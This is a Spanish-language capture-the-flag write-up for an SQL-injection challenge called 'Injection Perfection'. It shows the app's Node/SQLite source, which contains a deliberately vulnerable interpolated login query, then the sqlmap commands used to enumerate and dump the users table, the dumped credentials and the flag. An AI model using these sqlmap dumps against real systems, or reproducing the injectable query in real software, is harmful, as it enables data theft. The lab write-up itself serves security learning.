Injection Perfection

After port scanning the acmcyber site, I found [this](https://injection-perfection.acmcyber.com/) hidden login page. After bruteforcing I discovered the user: joe, has the password: bruin, but I didn't find anything useful. Can you log in as admin? [source](../attachments/src.tar.gz)

Author: Rory

Tags: sqli

---

Bajamos source, extraemos y vemos el contenido de los archivos, particularmente el de index.js:

```javascript
const express = require('express');
const path = require('path');

const multer = require('multer');
const bodyParser = require('body-parser');

const port = parseInt(process.env.PORT) || 8080;

const sqlite3 = require('sqlite3');
const db = new sqlite3.Database('app.db', sqlite3.OPEN_READONLY);

const app = express();
const upload = multer();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(upload.array());
app.use(express.static('public'));

const getFavColor = async (username) => {
	return new Promise((resolve, reject) => {
		db.get('SELECT fav_color FROM users WHERE username=?', username, (err, row) => {
			if (err) return resolve(err);
			return resolve(row.fav_color);
		});
	});
};

const attemptLogin = (username, password) => {
	return new Promise((resolve, reject) => {
		db.get(`SELECT username, password FROM users WHERE username='${username}'`, async (err, row) => {
			if (err)
				return reject(err);
			else if (row === undefined)
				return reject('Invalid User');
			else if (password === row.password)
				return resolve(`My favorite color is ${await getFavColor(row.username)}`);
			else
				return reject('incorrect password');
		});
	})
};

app.get('/', (req, res) => {
	res.sendFile(path.join(__dirname, 'login.html'));
});

app.post('/', async (req, res) => {
	const username = req.body.username;
	const password = req.body.password;

	if (!username || !password)
		return res.status(400).send("Invalid Login");
	
	try {
		return res.status(200).send(await attemptLogin(username, password));
	} catch (err) {
		return res.status(400).send(err);
	}
});

app.get('*', (req, res) => {
	res.status(404).send('not found');
});

app.listen(port, () => {
	console.log(`Listening on port ${port}`);
});
```

Podemos saber que usa como base de datos sqlite3. Usamos sqlmap:

`sqlmap -r rory.req --tables`

```bash
[07:35:22] [INFO] fetching tables for database: 'SQLite_masterdb'
[07:35:22] [INFO] fetching number of tables for database 'SQLite_masterdb'
[07:35:22] [INFO] resumed: 1
[07:35:22] [INFO] resumed: users
<current>
[1 table]
+-------+
| users |
+-------+
```

Para obtener los datos de la tabla users usamos:

`sqlmap -r rory.req -T users --dump`


```bash
Database: <current>
Table: users
[3 entries]
+------------------------------------------------------------------+------------+-----------------------------------------------+
| password                                                         | username   | fav_color                                     |
+------------------------------------------------------------------+------------+-----------------------------------------------+
| bruin                                                            | joe        | blue                                          |
| bedwarsplayersarelikefliesexceptflies                            | gamerboy80 | red                                           |
| ad28b35084eabdb7edd22df20378748eb7575aef1342775f151efdc79abda430 | admin      | flag{red_is_the_best_color_fight_me_you_wont} |
+------------------------------------------------------------------+------------+-----------------------------------------------+

```

Flag: flag{red_is_the_best_color_fight_me_you_wont}